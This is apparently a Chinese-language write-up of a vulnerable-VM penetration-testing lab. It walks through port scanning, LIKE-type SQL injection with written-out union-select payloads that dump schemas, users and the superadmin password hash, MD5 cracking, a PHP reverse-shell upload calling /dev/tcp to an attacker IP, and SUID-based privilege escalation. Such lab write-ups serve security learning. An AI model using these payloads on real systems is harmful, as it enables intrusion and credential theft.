## 扫描

```
扫描发现了开放端口22和80
```

## 服务枚举

```
对ssh进行尝试，可以使用密码登录
```

## web

## xss检测

> 首页是一个简单登录页面，用注册功能注册账户，发现是一个图书查询相关系统，页面头部有登录名的回显，注册一个带有xss语句的用户发现，并没有xss的注入漏洞

## sql注入

> 对注册和登录还有图书查询功能进行sql注入检测发现了注入漏洞

* ***图书查询功能的注入***
> 输入a会查询所有以a开头的数据，不输入会输出所有的数据，怀疑是like型注入，闭合符号为%'
> 输入语句 a%' and 1=1#,页面回显正常

![[Pasted image 20240111173856.png]]

![[Pasted image 20240111173912 1.png]]
> 经过测试数据有3列

![[Pasted image 20240111174000 1.png]]

> 得到数据库名webapphacking
![[Pasted image 20240111174052 1.png]]
> 查全部库

`a%' union select 1,group_concat(schema_name),3 from information_schema.schemata#`
![[Pasted image 20240111174229 1.png]]
> 查webapphacking中的表

`a%' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='webapphacking'#`
![[Pasted image 20240111174717 1.png]]
> 查users表中的全部字段

`a%' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='webapphacking' and table_name='users'#`
![[Pasted image 20240111174842.png]]
> 查数据

`a%' union select 1,group_concat(user),3 from webapphacking.users#`
![[Pasted image 20240111175104.png]]

![[Pasted image 20240111175202.png]]
>**同时发现刚才注入的xss语句也被执行了，说明还存在存储的xss漏洞**


> 查找superadmin的密码

`a%' union select 1,group_concat(pasword),3 from webapphacking.users where user='superadmin'#`

![[Pasted image 20240111175425.png]]
> 得到superadmin的hash进行hash-identifier发现是md5，查找在线解密网站进行解密

![[Pasted image 20240111175700.png]]

> **返回登录界面进行登录后发现，是一个上传点**


![[Pasted image 20240111175827.png]]



> 直接尝试上传一个php的反弹shell

`<?php system("bash -c 'bash -i &>/dev/tcp/172.26.32.20/4444 0>&1'")?>`


## 提权

>终端升级
>/usr/bin/script -qc /bin/bash /dev/null
>export TERM=xterm 

> 查找网站的config.php配置文件，发现了数据库的root密码

![[Pasted image 20240111180114.png]]

> 而且查家目录发现了两个用户legacy 和hackme还有root。用这个密码进行尝试，发现并不是用户的凭据，登录mysql查看是否可以udf提权

![[Pasted image 20240111180401.png]]

> 发现不可以使用udf提权，寻找可写文件和有s位的文件

`find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys`
`find / -perm -u=s -type f 2>/dev/null`

> 发现了legacy的家目录有一个touchmenot

![[Pasted image 20240111180648.png]]

>直接执行后发现提权成功

![[Pasted image 20240111180822.png]]














